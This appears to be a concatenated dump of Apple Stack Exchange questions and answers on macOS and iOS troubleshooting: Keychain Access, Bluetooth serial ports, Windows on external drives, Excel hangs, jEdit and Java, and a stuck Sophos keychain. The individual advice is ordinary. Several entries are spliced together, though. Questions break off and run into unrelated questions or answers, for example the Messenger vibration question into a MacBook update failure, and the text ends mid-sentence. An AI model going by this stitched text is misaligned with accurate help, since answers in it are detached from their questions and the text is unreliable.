Keychain Access\n\n*Open Preferences\n\n*Tap Password\n\n*It will ask you to input a password\n\n*Once completed input the password\n\n*Open Keychain Access again\n\n\n\nA: Nothing has changed in the last 4 years where your data is suddenly \"locked out and tied to your AppleID\", nor is it the fact that you do not use iCloud that prevents you from viewing secured notes.\nWhen you have Keychain Access running (as you mention you do), you can press Cmd-1 to show its main window.\nIf you have multiple monitors or AirPlay, the window might show up on one of those. You can also try activating Expose to get an overview of your open windows, and you might find it more easily there.\n\nA: I'm answering my own question just in case anyone else runs into this.  Today when I booted up my machine, I was prompted to update my version of MacOS, which was no surprise.  I kicked off the update, and once it was finished, it requested I restart the machine.  I turned it off, and then turned it back on and it went through a typical update process on reboot.\nWhen MacOS booted up, it didn't tell me that there were more updates, so I went on with the task I needed to accomplish, which in this case was opening up Keychain Access to look for the respective secure note I mentioned above.\nAlthough I've had no update or notice, I decided to try and reboot the machine again.  This time, I selected Restart from the Apple menu and, sure enough, after the screen went black and the Apple logo popped up, it went through what looked like another 60 seconds of updates.  After MacOS finished booting up, I went back to open Keychain and it opened up properly.\nI have no clue what happened, but it seems my update to the current version of Big Sur needed to reboot twice.  So, if you happen to see this bug (which I couldn't find mention of anywhere on the web) just restart your machine again and it should fix it.\n\nA: I have had the same problems for years. I open up the app but no window is visible. I have to restart the app and the full window appears again.\n", "Q: Connect to Android Device via Bluetooth Serial Port I have been using Bluetooth Serial Port (BSP) at /dev/tty.**** successfully in the past in order to communicate between macOS Big Sur (11.3.1, M1 processor) and Android (8.1).\nHowever, when I want to connect my Android device to a new computer, pairing works but macOS almost never creates the /dev/tty.**** device which makes the setup of a new machine very random. I noticed that the bluetooth device stays not-connected; if I force-connect it it connects for a few second then goes back to \"not connected\".\nFiles sharing works as well: in this case the bluetooth connects, the file transfers, then the bluetooth disconnects. And still I never see the tty device.\nMy question is:\n\n*\n\n*is there some configuration needed to be done on macOS or Android side to get the tty device?\n\n*is there any other solution or tool I could use to communicate via Bluetooth with Android that does not depend on tty. I'm thinking for example a way to connect via MAC address, and send/receive data the same way I use the serial port\n\nNote:\n\n*\n\n*the same tablet connects to Linux and Windows, but I need to use macOS.\n\n*the same issue occurs with Fire OS 7.3.1.9 on Android side, as well as macOS Mojave (10.14.6) with an Intel processor.\n\n*I currently use Python to read/write to the BSP, but I can use any command line tool / language in the middle (as long as it works with macOS Big Sur with a M1 processor)\n\nThank you.\n\nA: It looks like macOS will only create the tty device if the Android app (that creates the serial Bluetooth service) is launched at the moment of the pairing.\nIf I pair first, and launch the app  after, then the device won't appear.\nIt won't work even if I disconnect and reconnect while the app is on. It has to be during the pairing.\n", "Q: How disable Messenger vibration on iOS 14 I want to disable Messenger notifications from vibrating on my iPhone iOS 14, but keep them silent. How to do that?

Yesterday morning I have turned on my 2016 year MacBook Pro (MacBookPro14,3) with touchbar, just to discover that it now shows the message that \"A critical update must be installed to your Mac, yet the update cannot be installed, yet the Mac cannot be used till it will be installed\", so what's now?\n\n*\n\n*I have retried multiple times as the dialog suggests.\n\n*I booted into minimal mode by holding the left shift. It boots in this mode. In the App store I have, indeed, found a big update pending that \"requires restart\". I have updated all other apps but this was not helpful.\n\n*I tried to reset the operating system by booting with CMD+R, this way of booting worked but no attempts to reset were successful.\n\n*The Mac was running High Sierra. I have updated it to Big Sur from minimal mode, and even looks like I have succeeded. The error message now shows up in the differently looking dialog but it is still the same:\n\n\nThe message in App store about the important update that was visible under High Sierra is now gone. Under Big Sur, the updates tab is empty now.\nFinder still shows over 500 Gb of free space remaining so this is not due simply running out of disk space.

Or would it run Linux maybe?\nApart from the advice how to fix the laptop, it would be very interesting to know what is the update here so critical that the computer cannot be used at all if it cannot be installed.\n\nA: A quick Google search of the error message makes it seem common to Macs with a T1 chip (like yours), particularly its firmware. There isn't really a clear solution though. You could try:\n\n*\n\n*Internet recovery (Cmd+Opt+R at boot)\n\n*A bootable installer.\n\n*Disabling any firewalls through safe mode (Shift at boot), as they are said to cause issues by blocking an update from Apple\n\n*Getting the logic board replaced\n\nAs for running Linux, depending on what point in the boot process the error occurs, it might be possible.\n\nA: After finally bringing the laptop to the authorized Apple reseller, it was found this is the hardware issue. The logic board needs to be replaced. This part and work costs about the price of a new rather low end laptop; not yet the price of a new Macbook Pro.\nI think it is really something about security chip of something the like, because the laptop still boots into safe mode with the most of functionality available but of course very inconvenient to use this way.\n", "Q: Annoying white rounded rectangle follows cursor around after wrong keyboard shortcut After making the wrong keyboard shortcut, a weird rounded rectangle with a thick white border appeared around my cursor and followed the cursor around.\n(I was trying to make the shortcut that arranges icons by kind)\nInside the rectangle the screen was almost normal but kind of pixelated.

I sometimes have the following behavior:\n\n*\n\n*the screen scrolls down by one third,\n\n*the top one third of the screen is black, but I can still swipe the screen up (upward gray chevron)\n\nthis behavior is shown in this screenshot (while opening signal.app):\n\nI have difficulties reproducing this behaviour or the sequences of gestures, still it happens quite frequently. I am very puzzled about its potential function - I am certainly missing something, and tried various combinations of gestures without any other possibility than just returning to initial state. any clue?\n\nA: The behavior you are looking at is an iOS feature called Reachability. This feature was made available for large screen iPhone (4.7\" and larger) to enable easy single handed usage.\nReachability lets users easily access out of reach, on-screen elements on their iPhone with single hand usage. It lets you temporarily bring items at the top of the screen down to the lower half of the screen. This way, when using your iPhone with single hand, you can tap on out of reach on-screen elements.\nYou can turn Reachability on or off by going to Settings app → Accessibility → Touch.\n\n*\n\n*On an iPhone with Face ID: Swipe down on the bottom edge of the screen.\n\n\n\n*On an iPhone with a Home button: Lightly double-tap the Home button.\n\nYou can learn more about this feature here:\n\n*\n\n*https://support.apple.com/en-in/guide/iphone/iph77bcdd132/14.0/ios/14.0#iph145eba8e9\n\nA: It's called Reachability.

I have a MacBook Pro 13' 2017 with 250GB of storage. The internal SSD has died unfortunately. Occasionally, it will show up and be able to boot from it but leaving the MacBook on sleep for more than an hour or so makes it crash and it refuses to boot then.\nSo, I've since installed MacOS on my external SSD (Samsung T7 Touch 500GB) which works fine. Now, I'd like to also install Windows 10 on that same drive but I'm unsure how I would do that or if it's even possible.\nThe first problem that I encounter, for example, would be that Bootcamp tells me to unplug all external devices before I can run it, which of course I can't because that's where I have my MacOS installed.\nI've seen this question but I'm not sure how I would go about setting up my partitions as described in one answer.\n\nA: Running macOS from external drives is easy and supported by Apple in firmware, software and testing.\nRunning Windows on an external drive via boot camp is the opposite. It is not so easy or vendor documented / supported / tested by Apple.\nThat being said, it’s a very common request, so here is that thread of some awesome custom setups to attempt this in your case if you want to give it a shot.\n\n*\n\n*Is it possible to use Boot Camp with Windows 10 from an external HDD?\n\nA: Be aware, the internal drive is needed to do firmware updates. Currently, firmware updates are included in with certain versions of macOS. This would mean you could end up failing to install a clean version of macOS or have a failure while running a routine update to macOS.\n\nI do not know for sure why the internal drive is needed for firmware updates. On my HP PC, a firmware update is performed by first copying the update file to the FAT32 formatted internal EFI partition, then the firmware is asked to update itself. The firmware then reads the update file from the internal EFI partition. I assume this is also true for Macs, but I do not know for sure.\n\nAn exception to have a working internal drive for firmware updates may exist by using an external Thunderbolt 3 drive (such as the Samsung X5). On a 2018 Mac mini, the Samsung X5 shows up as disk0 and the internal drive appears as disk1. Also, both drives appear as NVMe drives.\nOtherwise, macOS can be installed on an USB external drive. The Boot Camp assistant can not be used to install Windows on a external drive. Installing windows manually can not be done on an external USB drive by just using the Windows installer GUI. However, Windows 10 can be installed on an external drive by using the Windows 10 CLI. In other words, you can open a Command Prompt window while running the Windows 10 GUI installer and enter commands to install Windows 10 on an internal or external drive.\nThe basic steps for installing Windows 10 on an external drive are are as follows:\n\n*\n\n*Use MacOS to create space for Windows 10. The diskutil command is usually more reliable than the Disk Utility application.\n\n*Use the Boot Camp Assistant to download the Windows Support Software. This contains the Windows 10 drivers.\n\n*Use macOS to create the Windows 10 installer. You will need a Windows 10 ISO file. Usually the contents of the ISO file is this placed on an ExFAT formatted flash drive. This flash drive should include a copy of the Windows Support Software.\n\n*Boot from the Windows 10 GUI installer on the USB flash drive.\n\n*Open a Command Prompt window and install a bootable Windows 10. The three basic commands needed are given below.\n\n*\n\n*diskpart: This command is used to edit and format the partitions.\n\n*dism: The command copies the Windows 10 image to the external drive and installs Windows 10 drivers from the Windows Support Software to the Windows store on the external drive.\n\n*bcdboot: This command installs the Windows 10 boot files to the EFI partition. Usually, this is the EFI partition on the external drive.\n\n\n\n*Boot to Windows 10 and follow the instructions.\n\n*Run the Setup.exe application included with the Windows Support Software.\n\n", "Q: MacOS - Excel - Copy / paste causes spinning beachball I'm looking for suggestions as to the cause / solution to a spinning beachball every time I try and copy/paste in Excel.\nThis happens more on some spreadsheets, but is happening in one I use frequently which is only 700kb. I am using Office 365, and my MBP is 2018 (2.6 GHz i7, 32GB RAM), running Catalina. It does however seem independent of device, as I recreated it on my partners MacBook Air (2011, 2.0GHz i7, 8GB RAM) running High Sierra.  The desired file is stored locally but mirrored in iCloud).\nI am aware that was a problem in Office 2011 for Mac, but my online search hasn't found posts with this problem recently. I have tried an older suggested workaround of copy/pasting a blank cell in a blank spreadsheet before opening the desired file as suggested at Excel 2011 copy and paste beachball hang freeze issue\nI have also tested with desired file mirrored on a different cloud, and also just saved locally without any cloud mirroring, - all have similar problems.\nThanks @pion for the specific detailed advice to capture what my system is doing when it happens.  This is available at https://gist.github.com/KathParamedic/6b13f7556c76e8ba0255579e2f3322d6\nThanks in anticipation\n\nA: The procedure for investigating a generic process hang when you have no other hints is to collect a symbolicated spindump of the system. What this does is take a bunch of freeze-frames of all user and system processes (including the kernel) for 10 seconds and shows you how much of that time is being spent in any given function call stack. By finding the stacks where a lot of time is being spent, you can usually get a good idea of where the slowness might be coming from and then focus your investigation on that. We collect a system-wide spindump rather than just the dump for a single process because it is common for system calls and/or interprocess communication to be involved in these sorts of hangs.\nHere are the steps:\n\n*\n\n*Run the following Terminal command to enable kernel symbolication: sudo nvram boot-args=\"keepsyms=1\". Make sure to copy-paste this so that you're entering straight quotes (\"\") rather than curly/“smart” quotes (“”) - it's a very subtle difference. (Important: If you get a permission error when doing this, you will first need to disable System Integrity Protection. You can re-enable it after you're done with this investigation.)\n\n*Reboot your machine and don’t open any apps except for Terminal.\n\n*In Terminal, enter the following command, press Return, type in your password, but do not press Return again yet: sudo spindump -reveal -noProcessingWhileSampling\n\n*Open Excel and start your normal workflow. Continue until you start experiencing the beachball.\n\n*As soon as you get the ball, go to the Terminal window where you entered your password and press Return so that the command begins to execute. Do not do anything else on the computer while it's running, otherwise you will distort the data collection.\n\n*After waiting for >10 seconds to collect a sample and another minute or two to symbolicate and format, you’ll get a file in /tmp/spindump.txt that contains a stackshot of every process.\n\n*Upload the file to PasteBin or some equivalent place and add the link to it to your original question.\n\n", "Q: Magic Keyboard Failing to Switch Between Mac OS and Windows Bootcamp I frequently switch between Mac OS and Windows 10 but my Magic Keyboard seems to struggle to connect even though it's paired with both.\nWith Mac OS (when switching from Windows), if I click on it in the Bluetooth menu, it highlights briefly but never connects.  However, if I plug it in to \"charge\" and then disconnect it, it will generally (but not always) connect.\nIn Windows (when switching from Mac), I can sometimes get it to connect if I tap keys during the loading process, but this seems silly and inconsistent.  If it doesn't connect during Windows loading, I generally can't get it to connect at all without simply deleting it and re-pairing the device.\nI read somewhere a while ago that this is because MacOS and Windows use different Bluetooth Addresses and that you can fix this problem by editing the Windows registry to match the Mac Bluetooth address.  However, my Googling skills have failed me and I can't find the post anymore and I'm not even sure it works.\nHas anyone else had this problem and can help me resolve it?  Thanks!\n\nA: This is a common bluetooth issue. If you are using, say, MacOS at the moment with your Magic Keyboard connected (by bluetooth), and you restart into BootCamp, many bluetooth devices including Headphones, Earphones, etc. do not reconnect automatically, which you already found out, is due to Mac Address.\nForgetting the device and reconnecting through settings (Windows) or System Preferences (MacOS) is faster than plugging it in and out of charging, and it works perfectly fine for me. You don't have to forget and reconnect every time you start your Mac; only those times when you boot into the other OS.\nAs for how to change the bluetooth addresses, follow these steps:\n\n*\n\n*Make sure you have bluetooth icon on the menubar (if in Catalina),\nand if in Big Sur, simply click on control centre.\n\n*Hold Alt/Option and click on Bluetooth.\n\n*You will see your bluetooth address there. Write it down (exact) or write it in cloud based docs or similar to access it on Windows side.\n\n*It is discouraged to try to change the Bluetooth Mac Address, as answered here (Quora). Although, there is a third party app with which you can change the Mac Address of the Bluetooth module. (only do this if you are annoyed by forgetting and reconnecting the bluetooth devices repeatedly)\n\n*The third party app is Mac Address Changer for Windows. Install it, run it, enter the Mac Address you wrote down earlier, and click change. (There are images on the website too).\n\nThank You.\n", "Q: Occasionally I see camera usage indicator as I unlock my iPhone I see the green dot on screen as I am about to unlock my iPhone, what can cause this?

I can't find any online confirmation of that, though.\nThere are other 6,1 models that came with 10.2.7, but they have a 1.25 GHz processor.\nThe USB ports on that Mac are v1.1 (12 Megabits/s!), so they would be painfully slow, even if you did get it working. I don't know if that might even contribute to the error.\n\nI had one of these models recently - and I replaced the internal drive with a new 2.5\" laptop drive, using an IDE to SATA adaptor. It ran well on OS X Tiger 10.4. Leopard was a bit slow, and with Tiger I could still use Classic.\nSo, if you want to get this up and running, my advice would be to find a 'generic' Tiger installer DVD.

That said, one irritating thing that happens is when I invoke Textedit (v1.11) for anything, it opens every Textedit file it can find - is this a feature or a fault? (Note that I did call Apple Help about this a couple of years ago, and the \"helper\" hadn't even heard of Textedit, and her advice eventually led to having to recover from a backup, done without Apple's \"help\" - they denied responsibility for bad advice.)\n\nA: By default, TextEdit (and other Apple apps) will re-open every document if you quit it without closing them first. My suspicion is that you've just quit the app without closing the documents every time, and this has built up.\nYou can close all the open documents by holding the Alt/Option key and clicking the red button in the top left corner of any one window.

It would then be a matter of pressing the key of the first letter of the color, or other menu entry, and then the enter key.\nSo adding a keyboard shortcut to the Automator Service/Quick Action, e.g., ⌃⌘C, then to change to e.g., Blue, one would press, e.g.,: ⌃⌘C   B  enter\nThe example AppleScript code, shown below, was tested in Script Editor, and as an Automator Service/Quick Action, under macOS Big Sur with Language & Region settings in System Preferences set to English (US) — Primary and worked for me without issue1.\n\n*\n\n*1  Assumes necessary and appropriate settings in System Preferences > Security & Privacy > Privacy have been set/addressed as needed.\nAs this uses UI Scripting it can be kludgy and prone to failure for a number of different reasons. Changes to the hierarchical UI element  structure, timing issues in the value of a delay command, etc. However, when it works, it works! \n\n*\n\n*In Automator create a new Quick Action with settings as shown in the image below.\n\n\n*Add a Run AppleScript action replacing the default code with the example AppleScript code show below.\n\n\n*Save it as, e.g.,: Change Highlight Color\n\n\n*Then in System Preferences > Keyboard > Shortcuts > Services assign it a keyboard shortcut of, e.g.,: ⌃⌘C\n\n\n*Next trigged the Service/Quick Action manually from the Services menu in Preview so as to trigger the  Security & Privacy related dialog boxes and once that is dealt with the keyboard shortcut can be used freely.\nExample AppleScript code:\ntell application \"Preview\" to activate\n\ntell application \"System Events\"\n    tell group 2 of ¬\n        toolbar 1 of ¬\n        window 1 of ¬\n        application process \"Preview\"\n        try\n            click menu button 1 of group 1\n        on error\n            try\n                click menu button 1 of radio group 1\n            end try\n        end try\n    end tell\n    tell group 2 of ¬\n        toolbar 1 of ¬\n        group 1 of ¬\n        window 1 of ¬\n        application process \"Preview\"\n        try\n            click menu button 1 of group 1\n        on error\n            try\n                click menu button 1 of radio group 1\n            end try\n        end try\n    end tell\nend tell\n\nNotes:\nI have edited out the original answer, and an update, to replace all of it with a KISS version of the script. (One can review the edit history if one wants.)\n\n*\n\n*As coded, this works on a normal window, Full Screen View window and single/multiple display/monitor scenarios.\n\nNote that if the assigned keyboard shortcut is pressed and either a window does not exist or the Toolbar is set to be hidden the script silently errors out, otherwise it attempts to make the menu show. By coding it this way and adding the additional try statements, it negates the need to ascertain whether the window is a normal window, Full Screen View window and using single/multiple display/monitor.\nAs this script uses UI Scripting and the hierarchical UI element structure changes between Preview being first opened, and the target menu having been first clicked and is different in a normal window vs. a Full Screen View window, this is why it's written using try statements. It allows for one of the four possible  hierarchical UI element structures to be acted upon and done so without causing an error that would stop the process otherwise.\nAssuming the necessary and appropriate settings in System Preferences > Security & Privacy > Privacy have been set/addressed as needed and the Toolbar is available, not set to be hidden, this script should work as is until the hierarchical UI element structure changes in updates/upgrades to macOS. If one needs to troubleshoot the script not working, then run the script in Script Editor where one can examine it with the Log pane showing when run. Note that the, e.g., delay 0.5 command will need to be added between the first and second lines of code when testing in Script Editor.\nThe keyboard shortcut, e.g., ⌃⌘C is just an example because it was not already assigned elsewhere in Preview and can be set to whatever one likes that is not already assigned. (I actually have mine set to ⇧⌘H from a previous answer on a different site and didn't realize it when posting this answer originally.)\nNote that once the menu shows, one can also use the up/down arrow keys to navigate the menu and or press the esc key to dismiss it without making a change.\n\n\n\nNote: The example AppleScript code is just that and sans any included error handling does not contain any additional error handling as may be appropriate. The onus is upon the user to add any error handling as may be appropriate, needed or wanted. Have a look at the try statement and error statement in the AppleScript Language Guide. See also, Working with Errors. Additionally, the use of the delay command may be necessary between events where appropriate, e.g. delay 0.5, with the value of the delay set appropriately.\n", "Q: MacBook Pro 13\" M1 True Tone and automatic brightness stopped working I recently noticed a problem with my computer.

You should see a \"Contents\" directory, and be able to edit an \"info.plist\" file.\nWhat sneaky settings? Well I got enough clues from this jedit forum post.\nFirst we need to create a symlink from Plugins (also in the \"Contents\" directory) through to where our JDK is installed. In my case I wanted it to use my homebrew installed JDK, so I needed to do...\ncd /Applications/jEdit.app/Contents/PlugIns\n\nln -s /usr/local/opt/openjdk/libexec/openjdk.jdk openjdk\n\n(Creates a symlink called \"openjdk\")\nHaving done that, we can add an entry in info.plist looking like this:\n        <key>JVMRuntime</key>\n        <string>openjdk</string>\n\nIt probably doesn't matter where in the file. I put these two lines above  <key>JVMOptions</key>\nHaving done that, I can now click the jedit icon in Applications, to start it up!\n\nA: I installed Java 11 and jEdit via homebrew on MacOS Big Sur. For me, this works to start jEdit afterwards:\n/usr/local/opt/openjdk@11/bin/java -jar /Applications/jEdit.app/Contents/Java/jedit.jar 2> /dev/null &\n\nYou can of course simplify this by adding the java 11 binary to your path, by setting aliases or writing a little shell script wrapper, but this is what's gonna work out of the box.\n\nA: Just for information, as posted solution with Info.plist, works great for me!\nAnyway, I was looking for something that acted globally, like a config or setting (sneaky too :-)), who let open any UI Java App without giving error message:\n\n\"This application requires that java 11 or later be installed on your computer.\"\n\nEnvironment is:\n\n*\n\n*MBA (Intel) with Big Sur 11.6.1\n\n*Homebrew with openjdk and jEnv (macos-javahome)\n\n\n1. Using jEnv command 'macos-javahome'\nPurpose was to try jEnv command:\n$ jenv macos-javahome\n\nas it should (conditional is mandatory) set JAVA_HOME for all GUI Applications through launchctl setenv, as stated here:\n\n# Usage: jenv macos-javahome\n\n#\n\n# Installs a file located at ~/Library/LaunchAgents/jenv-environment.plist . It sets JAVA_HOME for GUI\n\n# applications on startup for the **currently active version of Java**.\n\n\nFirst thing, in Big Sur 11.6.1, there is no ~/Library/LaunchAgents folder under my profile directory.\nI created it anyway, with right perms just to go further with jEnv and apply all changes and restart everything you need.\nThe final result that is this setting through jEnv is completely ignored by UI Java Apps, and still get error:\n\n\"This application requires that java 11 or later be installed on your computer.\"\n==> This way with jEnv and Big Sur 11.6.1 don't work.\n\n2. Modifying OpenJDK to run Java applications\nPurpose was to modify OpenJDK's Info.plist adding BundledApp capability, as pointed here and here.\nIn brief, in my environment, modify the file /Library/Java/JavaVirtualMachines/openjdk.jdk/Contents/Info.plist from this\n<key>JavaVM</key>\n  <dict>\n    <key>JVMCapabilities</key>\n      <array>\n        <string>CommandLine</string>\n      </array> ...\n\nto this\n<key>JavaVM</key>\n  <dict>\n    <key>JVMCapabilities</key>\n      <array>\n        <string>BundledApp</string>\n        <string>CommandLine</string>\n        <string>JNI</string>\n      </array> ...\n\n==> Also this way with a modified OpenJDK's Info.plist and Big Sur 11.6.1 don't work.\n\nResults\nAfter trying, both ways don't work at the moment in my environment with Big Sur 11.6.1.\n\nThat one with jEnv don't work in opposition to what jEnv macos-javahome command says. Here it also seems that Java UI Apps completely ignore JAVA_HOME environment variable, whether it is set through shell (ex. zsh) or jEnv macos-javahome.\n\nThat one with OpenJDK modification, apparently jEdit App isn't looking for those JVM capabilities in OpenJDK's Contents/Info.plist.\n\nA: My opinion and an indirect solution. jEdit is just searching your path for the java11 binary. I am a Java developer since 1996.\nbrew install java  didn't work so well for you did it?  I prefer not to do it that way because of issues like this.\nHaving Java at /usr/local/opt is wrong.\nJava JDK should be at  /Library/Java/JavaVirtualMachines .   I usually either manually download JDK and unzip it into the above folder OR install it via jenv command.  The former gives you more control.\nThen you should have  JENV installed and have this in your .bash_profile :\nexport PATH=\"$HOME/.jenv/bin:$PATH\"\neval \"$(jenv init -)\"\n\nDon't install Java with brew .  Instead:  brew install jenv .  Then, install Java (OR link to your installed java) using JENV.\n", "Q: How can I disable or control one-click photo sharing in iOS?

I tried seeing YouTube videos on how to disable the sound but none of them are helpful. I tried to turn on my live mode on but it still makes a sound.

We're not talking about extra mobile wallet functions, but a limitation -- a constraint. Ever since the iPhone 3GS arrived in Japan in 2008, taking a photo and even a screenshot (ugh) has been accompanied by a mandatory shutter noise -- one that iPhone users elsewhere probably turn off right away.

I just bought an iMac with internal 2 solid satte  drives - 128 GB Flash Storage and 1 TB SSD. The modification was the previous owner's idea as it was sold new with a 2TB Fusion Drive. What is the best way to use it, as it's my first time with 2 internal disks? I wanted to import everything from my MacBook through Time Machine, which was impossible, because I had about 180 GB of files and I couldn't boot the iMac from the SSD.\nIs there any way to have everything on the 1TB SSD and completely disregard the 128 GB disk?\nIf not, how does one use 2 disks correctly? I am so green I don't even know how to save files to the SSD other than dragging them to it through the finder. How do I go about saving files on my desktop, but have them reside on the SSD?\n\n\n\n\nA: Many iMacs and other Macs  have what is called a \"Fusion Drive\". These are made up of a small-capacity SSD (solid state disk) and a large-capacity HDD (mechanical hard drive).\nOriginally, they would be formatted in such a way that the OS would present them as one continuous volume. The point was to gain the benefit of the fast SSD and the large storage of the HDD.\nThe previous owner has replaced the mechanical drive with a new large SSD.\nEach separate volume can have an OS installed on it; otherwise, they present themselves as sub-folders of the /Volumes folder. You can store whatever files on them you like.\n\nA: I think I found the solution! I had to start the computer while holding CMD + R which allowed me to erase the disk and reinstall the OS.

I have a Mac mini M1, I usually use it at night, and shutdown it before I go to sleep. I go to work in the morning, and will use the Mac again at the night.\nAfter every shutdown, I unplug the power cord because I guess it will affect something bad to my Mac if I leave it plugged, am I right and is it necessary?\nAnd should I sleep the Mac instead of shutdown?\n\nA: While there are many opinions on what you should do and when you should do it there is no technical reason why you need to unplug your Mac when shutting it down at night. In fact you don't even need to shut it down at all.\nI have a Mac Mini that is attached to my main TV. It stays on all the time. I have a MBP that I never do anything more than shut the lid and let macOS decide what to do (usually just sleep/hibernate).\nThe only reason I can see to unplug your Mac would be that you have a lot of issues with power in your area. In other words there are frequent lightning strikes, the power coming into your place is \"dirty\" (EG it varies a lot in voltage, there are spikes and dips that could damage anything plugged into your place's power).\nAnd note that the average household has a lot of devices with computers in them (TVs, Microwave ovens, video game consoles, smart home devices, etc.)that are always plugged into power. If they have not been damaged by the power in your place it is unlikely that your Mac will.\nMe, I'd leave it plugged in and then either sleep it or shut it down, whichever you prefer. It won't hurt to unplug it but (excepting the issues I just outlined) it also is unlikely to hurt to leave it plugged in.\n\nA: As a general rule, you don't need to unplug your computer if your electrical installation and power supply provide power which complies with standard power quality rules.\nHowever, if you have low power quality in your home or office (i.e., grounding is not appropriate, or there are frequent surges and/or dips in power -- that you could see as sudden changes in the intensity of your office lights, for instance), it is advisable that you do this while you are not using your computer. That also removes the small amount of power that will be consumed by the computer to allow for it to be quickly started up.\nBut if you are indeed concerned with power quality, you should probably look into buying an UPS, to avoid issues with electricity affecting your computer.\nIncidentally, if you are really using your computer only at given hours, and you leave it connected, you can program your Mac so that it shuts down or starts up at a time of your choosing.\n\nA: There is no reason to even shut it off. I've been using Mac minis since the first model came out, I must be on my third or fourth and getting ready to buy an M1... and I have run them 24/7 for most of the last fifteen years. I'm running two right now, one sitting in the corner as a server.\nI can see my main one has been up for\n18:45  up 36 days,  5:37, 9 users, load averages: 2.94 3.41 4.47\n\nand I just rebooted the server recently\n18:45  up 7 days,  3:37, 2 users, load averages: 3.08 3.22 3.24\n\nThe one thing in the older models that might have the most potential to wear out is the hard drive, or perhaps the fan, but today's hard drives are SSD and from what I've seen online, the fan barely runs.\nOf course, you can if you want to - to conserve energy, or if your local power is inconsistent and you're concerned about power spikes. For the former, just set your Energy Savings so it goes to sleep which should shut down the monitor automatically, and for the latter... if you're that worried, what about when you're using it?  You'd want a UPS or good surge protector for that.\n", "Q: How can I remove a keychain that won't delete? I have a rogue keychain called Sophos.keychain. I uninstalled Sophos, but this pesky keychain won't go away. The reason I need it removed is Adobe's apps are trying to use it and it is causing errors.\nWhen I log in as root, I see the keychain in the Keychain Access app, but I cannot delete it. There is a small icon on the keychain file icon that looks like a user icon (maybe).\nWhen I am logged in as my normal admin account, I cannot see this Sophos keychain file.\nAs root, I have also tried deleting it via command line using security list-keychains and then security delete-keychain with the path to the Sophos.keychain file. Nothing seems work.\nSophos will not assist as I was using the free version. Googling how to remove it leads to dead ends. Apple has also been useless.\nWhen I login as root, I get these errors:\nClicking on Reset to Defaults, and putting in the password doesn't seem to do anything.\nI am on Big Sur 11.5.2\nAny ideas how I can remove this keychain file?\n\nA: This question seemed to contain the key to the answer:\n\nTo fix this you have to manually edit the file /Library/Preferences/com.apple.security-common.plist as root, and delete the corresponding hardcoded <dict>...Sophos...</dict> entry in there.\nGreat care must be taken because you can totally screw up  your system(-keychain) if you leave any errors inside this .plist file. The section that needs to be deleted looks as follows:\n ...\n <dict>\n     <key>DbName</key>\n     <string>/Library/Sophos Anti-Virus/Sophos.keychain</string>\n     <key>GUID</key>\n     <string>{some UUID string here}</string>\n     <key>SubserviceType</key>\n     <integer>6</integer>\n </dict>\n ...\n\n\nHowever, there your setup, as indicate in the comments, was somewhat different, and required finding the right file.\nThe relevant file path was found to be /private/var/root/Library/Preferences/com.apple.security.plist\n\nA: [I would just comment, but I don't have enough reputation points.]\nYou didn't say which version of macOS you're using, or if you actually got an error message when trying to delete the keychain from within the Keychain Access utility.  Years ago, I created a private keychain file to keep all my secure notes separate from my login.keychain (and a different password is required to open it).  That resulted in a file called <private keychain name>.keychain being created in the ~/Library/Keychains folder.  That file is still there to this day, and gets updated every time I modify the private keychain.  Nowadays, there is also a <private keychain name>.keychain-db file in the same directory.  Try to find your Sophos.keychain file(s) in a similar location on your system, and delete it/them using Finder or Terminal (perhaps make compressed copies in case you need to recover).  Please note, I have not tried this myself...  [On reading @juandesant's answer, I defer to his suggestion.]\n", "Q: MFI certification/ Detecting local wifi networks I am re-posting my previous question in regards to enabling our app to detect local wifi networks so that users can connect the product to wifi.\nMy company is developing an app enabled sound machine. The sound machine similar to many other products today like security cameras, computers, iPhones, even some air purifiers, takes you through a set up process through the app where you can then connect the device to a Wi-Fi network.\nTypically of course this Wi-Fi network that you connect to will be the Wi-Fi network in your home, or office, or wherever you will be keeping this product. When you are going through the app and get to the portion where you then connect the product to Wi-Fi all of the Wi-Fi network names in the area will pop up. So for example, if you live in apartment building your Wi-Fi network name  will pop up along with maybe three or four of your neighbors.\nNow this is the screen we are having a challenge with. You can manually type in your Wi-Fi network name and password and it will connect with no issues. But we are unable to get the app to detect the Wi-Fi network names in the area. This creates a massive inconvenience for users because at that point they have to type in both their WiFi network name and the password manually. They are unable to just click on their Wi-Fi network name then enter the password like other apps.\nWe have been reaching out to Apple development program but for some reason they have been denying us the ability to do this. We are Wondering if that is because of not having an MFI certification. Or if there is a different implementation that we are not considering.\n\nA: *\n\n*The MFI certification process entails that you need to submit a product plan to Apple, you need to use an authorized manufacturer to produce the MFi component, you to follow various guide lines from Apple and finally you need to submit an actual product and packaging to Apple for final approval.\n\n\n*Yes, you do have to submit an actual product to Apple for review. You cannot just send a link to a web page describing your product.\n\n\n*You seem to be relatively vague or unclear about the technical details on what you need to accomplish. This is why it is hard for others to direct you to the right place. In general you can easily let an app discover a non-MFi accessory via Bluetooth and you can definitely communicate with it over WiFi - all without MFi certification.\nHowever, depending on exactly what you mean by \"detecting local WiFi-networks\" you might still need to go through some kind of approval process, but it could be much easier than MFi certification.\nIf you quite literally mean that you need to detect all the local WiFi-networks, then the process is quite easy. It's not possible - MFi certified or not.\nHowever, that's usually (and quite obviously) not involved in connecting to accessories, such as for example a speaker.\nYou might mean that you to add a Hotspot Helper to your app. In that case you need to apply for the network extension entitlement for you app. That's usually very straightforward by simply filling out the form I have linked to, and then waiting a few days for Apple to approve (or not) the request. It does sound unusual for a Bluetooth speaker though.\nIt could also be that you really want to use the NEHotspotConfigurationManager API in order to temporarily connect to a WiFi network advertised by your speaker, or perhaps to add that WiFi network to the list of networks the phone will connect to. In that case you also need the entitlement described above.\nA third possibility is that you really wanted to use Wireless Accessory Configuration or perhaps you want the speaker to become available as a HomeKit accessory (i.e. using the HomeKit API).\nI would suggest that you visit this page from Apple's documentation in order to do the necessary research, so that you can clearly state the technical functionality that you want your app to include:\nhttps://developer.apple.com/library/archive/qa/qa1942/_index.html\n", "Q: Reduce brightness of white color (Whitepoint) on MacBook 2020 (eye strain, pain) My eyes hurt when I work with a MacBook. My eyes perceive other displays well.\nThe same problem was with my iPhone, my eyes hurt and I turned on \"Reduce Whitepoint\" (this is available only on iOS) and now I want to do the same thing on my MacBook, but I just can't figure out how to lower the brightness of the white color.\nI went into the color calibration settings and there you can change the color (for example, more yellow or blue), but this is not at all like on the iPhone.\n\n(not my screenshot)\n\nA: There are [at least] two ways to achieve this, one temporary, one 'permanent'.\nThis assumes you need this for comfort… as any adjustment of this type is not going to be useful if you need a professional colour-calibrated workflow, as it makes all the colours you see \"wrong\".\nThe temporary 